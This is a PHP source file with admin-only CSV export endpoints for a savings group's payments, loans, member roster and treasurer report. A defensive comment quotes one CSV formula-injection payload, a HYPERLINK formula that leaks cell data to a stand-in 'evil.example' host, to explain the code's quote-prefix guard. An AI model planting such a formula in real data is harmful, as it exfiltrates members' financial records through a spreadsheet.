<?php
/**
 * CSV export endpoints for admins/senior_admins/treasurers: payments, loans,
 * members and the treasurer's cycle report.
 *
 * These endpoints emit text/csv, NOT the JSON envelope every other handler
 * uses. The front controller sets Content-Type: application/json before
 * dispatch, so every function here OVERRIDES the headers itself, streams
 * rows with fputcsv(), and exits before the JSON envelope can append.
 *
 * MONEY SEMANTICS — same rules as payments.php / loans.php / cycle.php,
 * never re-derived differently here:
 *   loans.status has NO 'active' value. Money that has left the box is
 *   approved|disbursed|completed|defaulted.
 *   payments.approvalStatus: only approved|completed are real, verified
 *   money. A pending claim is never counted as received.
 *
 * Every money value is emitted exactly as the DB/money.php returns it — a
 * plain "0.00"-style decimal string, never reformatted with a currency
 * symbol or thousands separator.
 *
 * Every endpoint re-checks the caller's role server-side via require_role()
 * against the members table — a groupId in the query string is never an
 * authorization claim by itself.
 */

require_once __DIR__ . '/../lib/http.php';
require_once __DIR__ . '/../lib/session.php';
require_once __DIR__ . '/../lib/money.php';
require_once __DIR__ . '/../../config/database.php';
require_once __DIR__ . '/cycle.php';

// Same admin-equivalent gate as the rest of the treasurer-facing endpoints.
const EXPORT_ADMIN_ROLES = ['admin', 'senior_admin', 'treasurer'];

// Loans whose principal actually left the box. Mirrors CYCLE_BORROWED_STATUSES
// in cycle.php, but ALSO includes 'defaulted' — money that left the box and was
// never recovered is still money that left the box.
const EXPORT_LOAN_DISBURSED_STATUSES = ['approved', 'disbursed', 'completed', 'defaulted'];

// Only these count as real, verified money — never a 'pending' claim.
const EXPORT_PAYMENT_SETTLED_STATUSES = ['approved', 'completed'];

if (!function_exists('export_require_group_id')) {
    function export_require_group_id(): string
    {
        $groupId = (string) ($_GET['groupId'] ?? '');
        if ($groupId === '') {
            json_error('groupId is required.', 422);
        }
        return $groupId;
    }
}

if (!function_exists('export_optional_year')) {
    /**
     * Bounded exactly like list_payments' year param: absent means "no filter".
     */
    function export_optional_year(): ?int
    {
        if (!isset($_GET['year']) || $_GET['year'] === '') {
            return null;
        }
        $year = (int) $_GET['year'];
        if ($year < 2000 || $year > 2100) {
            json_error('year is not a valid year.', 422);
        }
        return $year;
    }
}

if (!function_exists('export_csv_headers')) {
    /**
     * Override the front controller's application/json header with the CSV
     * download headers. Must be called AFTER require_role() has succeeded
     * (an auth/role failure emits its own JSON error and exits first, which
     * is fine — the browser shows the JSON rather than downloading a file).
     */
    function export_csv_headers(string $name, string $groupId): void
    {
        $filename = $name . '-' . $groupId . '-' . date('Y-m-d') . '.csv';
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
    }
}

if (!function_exists('export_csv_cell')) {
    /**
     * Neutralise CSV FORMULA INJECTION.
     *
     * Several exported columns are MEMBER-AUTHORED free text (payment `notes`,
     * loan `purpose`, and even `fullName`). Excel / LibreOffice / Sheets treat a
     * cell beginning with = + - @ (or a leading tab/CR) as a FORMULA, so a member
     * could write a note like:
     *
     *     =HYPERLINK("https://evil.example/?leak="&A1,"Click for receipt")
     *
     * ...and it would execute in the spreadsheet of the treasurer — precisely the
     * person with the most authority and the most sensitive file open. The data is
     * not "trusted" just because it came back out of our own database.
     *
     * Prefixing with a single quote makes the spreadsheet treat the cell as text.
     * The value is unchanged for any non-formula cell, so money columns
     * ("1000000.00") and dates are emitted exactly as-is.
     */
    function export_csv_cell($value): string
    {
        $value = (string) $value;
        if ($value === '') {
            return $value;
        }
        if (strpbrk($value[0], "=+-@\t\r") !== false) {
            return "'" . $value;
        }
        return $value;
    }
}

if (!function_exists('export_csv_row')) {
    /** fputcsv() with every cell passed through the formula-injection guard. */
    function export_csv_row($out, array $row): void
    {
        fputcsv($out, array_map('export_csv_cell', $row));
    }
}

if (!function_exists('export_payments')) {
    /**
     * GET exports.payments — every contribution/seed/service-fee payment row
     * for the group, optionally filtered by year.
     */
    function export_payments(): void
    {
        $groupId = export_require_group_id();
        $year = export_optional_year();

        require_role($groupId, EXPORT_ADMIN_ROLES);

        $pdo = getDbConnection();

        $sql = 'SELECT p.uid, m.fullName AS memberName, p.paymentType, p.year, p.month, '
            . 'p.totalAmount, p.amountPaid, p.arrears, p.approvalStatus, p.paidAt, '
            . 'p.approvedAt, p.paymentMethod, p.notes '
            . 'FROM payments p '
            . 'JOIN members m ON m.groupId = p.groupId AND m.uid = p.uid '
            . 'WHERE p.groupId = :groupId';
        $params = [':groupId' => $groupId];

        if ($year !== null) {
            $sql .= ' AND p.year = :year';
            $params[':year'] = $year;
        }

        $sql .= ' ORDER BY m.fullName ASC, p.paymentType ASC, '
            . "FIELD(p.month, 'January','February','March','April','May','June',"
            . "'July','August','September','October','November','December')";

        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);

        export_csv_headers('payments', $groupId);

        $out = fopen('php://output', 'w');
        export_csv_row($out, [
            'uid', 'memberName', 'paymentType', 'year', 'month', 'totalAmount',
            'amountPaid', 'arrears', 'approvalStatus', 'paidAt', 'approvedAt',
            'paymentMethod', 'notes',
        ]);

        while (($row = $stmt->fetch()) !== false) {
            export_csv_row($out, [
                $row['uid'],
                $row['memberName'],
                $row['paymentType'],
                $row['year'],
                $row['month'],
                $row['totalAmount'],
                $row['amountPaid'],
                $row['arrears'],
                $row['approvalStatus'],
                $row['paidAt'],
                $row['approvedAt'],
                $row['paymentMethod'],
                $row['notes'],
            ]);
        }

        fclose($out);
        exit;
    }
}

if (!function_exists('export_loans')) {
    /**
     * GET exports.loans — every loan in the group.
     */
    function export_loans(): void
    {
        $groupId = export_require_group_id();

        require_role($groupId, EXPORT_ADMIN_ROLES);

        $pdo = getDbConnection();

        $stmt = $pdo->prepare(
            'SELECT loanId, loanNumber, borrowerName, principalAmount, approvedAmount, '
            . 'repaymentPeriod, totalInterest, totalRepayment, amountRepaid, '
            . 'remainingBalance, penaltiesCharged, status, isForced, requestedAt, '
            . 'approvedAt, purpose '
            . 'FROM loans WHERE groupId = :groupId ORDER BY requestedAt ASC'
        );
        $stmt->execute([':groupId' => $groupId]);

        export_csv_headers('loans', $groupId);

        $out = fopen('php://output', 'w');
        export_csv_row($out, [
            'loanId', 'loanNumber', 'borrowerName', 'principalAmount', 'approvedAmount',
            'repaymentPeriod', 'totalInterest', 'totalRepayment', 'amountRepaid',
            'remainingBalance', 'penaltiesCharged', 'status', 'isForced', 'requestedAt',
            'approvedAt', 'purpose',
        ]);

        while (($row = $stmt->fetch()) !== false) {
            export_csv_row($out, [
                $row['loanId'],
                $row['loanNumber'],
                $row['borrowerName'],
                $row['principalAmount'],
                $row['approvedAmount'],
                $row['repaymentPeriod'],
                $row['totalInterest'],
                $row['totalRepayment'],
                $row['amountRepaid'],
                $row['remainingBalance'],
                $row['penaltiesCharged'],
                $row['status'],
                (int) $row['isForced'] === 1 ? '1' : '0',
                $row['requestedAt'],
                $row['approvedAt'],
                $row['purpose'],
            ]);
        }

        fclose($out);
        exit;
    }
}

if (!function_exists('export_members')) {
    /**
     * GET exports.members — the group roster. Never emits a password hash or
     * any column outside the listed set.
     */
    function export_members(): void
    {
        $groupId = export_require_group_id();

        require_role($groupId, EXPORT_ADMIN_ROLES);

        $pdo = getDbConnection();

        $stmt = $pdo->prepare(
            'SELECT uid, fullName, email, phone, role, status, joinedAt, seedMoneyPaid, '
            . 'monthlyContributionsCurrent, eligibleForLoan '
            . 'FROM members WHERE groupId = :groupId ORDER BY joinedAt ASC'
        );
        $stmt->execute([':groupId' => $groupId]);

        export_csv_headers('members', $groupId);

        $out = fopen('php://output', 'w');
        export_csv_row($out, [
            'uid', 'fullName', 'email', 'phone', 'role', 'status', 'joinedAt',
            'seedMoneyPaid', 'monthlyContributionsCurrent', 'eligibleForLoan',
        ]);

        while (($row = $stmt->fetch()) !== false) {
            export_csv_row($out, [
                $row['uid'],
                $row['fullName'],
                $row['email'],
                $row['phone'],
                $row['role'],
                $row['status'],
                $row['joinedAt'],
                (int) $row['seedMoneyPaid'] === 1 ? '1' : '0',
                (int) $row['monthlyContributionsCurrent'] === 1 ? '1' : '0',
                (int) $row['eligibleForLoan'] === 1 ? '1' : '0',
            ]);
        }

        fclose($out);
        exit;
    }
}

if (!function_exists('export_report')) {
    /**
     * GET exports.report — the treasurer's per-member financial summary, plus
     * a final TOTALS row.
     *
     * Reuses cycle.php's cycle_collect_member_figures() / cycle_window() so
     * the status rules (settled contributions, money-left-the-box loans,
     * interest actually paid) can never drift from the cycle-equity view or
     * the payout preview. outstandingLoanBalance and arrears are the only
     * figures not already produced by that engine, so they are queried here
     * directly, with the same settled/borrowed status lists.
     */
    function export_report(): void
    {
        $groupId = export_require_group_id();

        require_role($groupId, EXPORT_ADMIN_ROLES);

        $pdo = getDbConnection();

        [$cycleStart, $cycleEnd] = cycle_window($pdo, $groupId);
        $figures = cycle_collect_member_figures($pdo, $groupId, $cycleStart, $cycleEnd);

        // outstandingLoanBalance: remainingBalance summed over this member's
        // loans that are money-left-the-box (never a pending/rejected loan).
        $loanPlaceholders = implode(', ', array_fill(0, count(EXPORT_LOAN_DISBURSED_STATUSES), '?'));
        $balanceStmt = $pdo->prepare(
            'SELECT borrowerId, SUM(remainingBalance) AS balance FROM loans '
            . 'WHERE groupId = ? AND status IN (' . $loanPlaceholders . ') '
            . 'GROUP BY borrowerId'
        );
        $balanceStmt->execute(array_merge([$groupId], EXPORT_LOAN_DISBURSED_STATUSES));
        $balanceByUid = [];
        foreach ($balanceStmt->fetchAll() as $row) {
            $balanceByUid[(string) $row['borrowerId']] = cycle_minor($row['balance']);
        }

        // arrears: sum of the group's current contribution arrears per member,
        // straight from the payments ledger (arrears is only ever positive on
        // an unsettled row, so no status filter is needed beyond the group).
        $arrearsStmt = $pdo->prepare(
            'SELECT uid, SUM(arrears) AS arrears FROM payments '
            . 'WHERE groupId = :groupId GROUP BY uid'
        );
        $arrearsStmt->execute([':groupId' => $groupId]);
        $arrearsByUid = [];
        foreach ($arrearsStmt->fetchAll() as $row) {
            $arrearsByUid[(string) $row['uid']] = cycle_minor($row['arrears']);
        }

        export_csv_headers('report', $groupId);

        $out = fopen('php://output', 'w');
        export_csv_row($out, [
            'uid', 'fullName', 'totalContributed', 'totalBorrowed', 'totalInterestPaid',
            'outstandingLoanBalance', 'arrears',
        ]);

        $totalContributedMinor = 0;
        $totalBorrowedMinor = 0;
        $totalInterestPaidMinor = 0;
        $totalOutstandingMinor = 0;
        $totalArrearsMinor = 0;

        foreach ($figures as $row) {
            $uid = $row['uid'];
            $outstandingMinor = $balanceByUid[$uid] ?? 0;
            $arrearsMinor = $arrearsByUid[$uid] ?? 0;

            $totalContributedMinor += $row['contributedMinor'];
            $totalBorrowedMinor += $row['borrowedMinor'];
            $totalInterestPaidMinor += $row['interestPaidMinor'];
            $totalOutstandingMinor += $outstandingMinor;
            $totalArrearsMinor += $arrearsMinor;

            export_csv_row($out, [
                $uid,
                $row['fullName'],
                money_from_minor($row['contributedMinor']),
                money_from_minor($row['borrowedMinor']),
                money_from_minor($row['interestPaidMinor']),
                money_from_minor($outstandingMinor),
                money_from_minor($arrearsMinor),
            ]);
        }

        export_csv_row($out, [
            '', 'TOTALS',
            money_from_minor($totalContributedMinor),
            money_from_minor($totalBorrowedMinor),
            money_from_minor($totalInterestPaidMinor),
            money_from_minor($totalOutstandingMinor),
            money_from_minor($totalArrearsMinor),
        ]);

        fclose($out);
        exit;
    }
}
